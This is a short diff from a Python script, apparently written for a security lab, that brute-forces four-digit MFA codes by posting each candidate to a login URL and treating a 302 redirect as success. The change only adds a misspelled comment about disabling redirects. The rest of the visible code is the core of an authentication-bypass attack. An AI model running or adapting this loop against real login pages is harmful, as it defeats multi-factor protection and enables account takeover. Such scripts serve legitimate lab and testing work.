@@ -26,7 +26,7 @@ headers = {
     code_str = f"{code:04}"   
     data = {"mfa-code": code_str}
 
-    response = session.post(url, headers=headers, data=data, allow_redirects=False)
+    response = session.post(url, headers=headers, data=data, allow_redirects=False)  # make allow_redir is false to privent 200 OK and show if it redir with 3xx
 
     if response.status_code == 302:
         print(f"[+] FOUND CODE: {code_str}")
